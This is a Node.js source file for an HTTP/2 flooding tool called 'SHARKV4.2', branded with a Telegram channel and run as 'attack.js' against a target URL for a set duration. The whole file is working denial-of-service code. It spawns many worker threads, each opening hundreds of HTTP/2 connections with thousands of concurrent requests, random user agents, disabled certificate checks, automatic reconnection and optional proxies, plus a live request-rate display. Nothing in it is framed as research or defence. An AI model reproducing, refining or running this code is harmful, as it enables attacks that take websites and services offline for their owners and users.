// SHARKV4.2 - T.ME/STSVKINGDOM
const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const net = require('net');
const fs = require('fs');
const readline = require('readline');

const PROXIES_ENABLED = 'N';
const POWER_MULTIPLIER = 1;
const MAX_INFLIGHT = 2000;
const REFRESH_RATE = 5000;

const TAGS = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];

let THREADS = getRandomInt(15, 35);
let totalRequests = 0, successCount = 0, errorCount = 0, rpsLastSecond = 0, maxRps = 0;
let endTime = 0;

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomTag() {
    return TAGS[Math.floor(Math.random() * TAGS.length)];
}

function randomUA() {
    return `Mozilla/5.0 (${Math.random().toFixed(4)}; V4) ${randomTag()}`;
}

function loadProxies() {
    try {
        return fs.readFileSync('proxies.txt', 'utf-8').split('\n').filter(Boolean);
    } catch {
        return [];
    }
}

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);
    endTime = Date.now() + duration * 1000;
    const proxies = PROXIES_ENABLED === 'Y' ? loadProxies() : [];

    console.clear();
    console.log(`SHARKV4.2 - T.ME/STSVKINGDOM`);
    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
        new Worker(__filename, { workerData: { target, duration, proxies, useProxies: PROXIES_ENABLED === 'Y' } });
    }

    setInterval(() => THREADS = getRandomInt(15, 35), 20000);
    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        printStats();
        rpsLastSecond = 0;
    }, REFRESH_RATE);

    function printStats() {
        const timeLeft = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV4.2 - T.ME/STSVKINGDOM`);
        console.log(`==============================`);
        console.log(`total: ${successCount + errorCount}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`==============================`);
        console.log(`succes: ${successCount}`);
        console.log(`vape: ${errorCount}`);
        console.log(`==============================`);
        console.log(`REMAINING: ${timeLeft} SEC`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'ok') successCount++, rpsLastSecond++;
            else if (msg === 'err') errorCount++, rpsLastSecond++;
        });
    });
    server.listen(9999);

} else {
    const { target, duration, proxies, useProxies } = workerData;
    const end = Date.now() + duration * 1000;
    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        while (inflight.count < MAX_INFLIGHT && Date.now() < end && !client.destroyed) {
            inflight.count++;
            try {
                const headers = {
                    ':method': 'GET',
                    ':path': '/',
                    'user-agent': randomUA(),
                    ':authority': new URL(target).host,
                    'accept': '*/*'
                };
                const req = client.request(headers);
                let counted = false;

                req.on('response', () => {
                    if (!counted) sendStat('ok');
                    counted = true;
                    inflight.count--;
                    req.close();
                });

                req.on('error', () => {
                    if (!counted) sendStat('err');
                    counted = true;
                    inflight.count--;
                });

                req.on('close', () => {
                    inflight.count--;
                });

                req.end();
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }
        process.nextTick(() => sendLoop(client, inflight));
    }

    function createConnection() {
        if (Date.now() > end) return;

        try {
            const client = http2.connect(target, {
                settings: { enablePush: false },
                rejectUnauthorized: false,
                ALPNProtocols: ['h2']
            });
            const inflight = { count: 0 };

            client.on('connect', () => {
                for (let i = 0; i < 100; i++) sendLoop(client, inflight);
            });

            client.on('error', () => client.destroy());
            client.on('goaway', () => client.close());
            client.on('close', () => setTimeout(createConnection, getRandomInt(500, 1000)));
        } catch {
            setTimeout(createConnection, 1000);
        }
    }

    const spawns = getRandomInt(500, 1000);
    for (let i = 0; i < spawns; i++) createConnection();
}
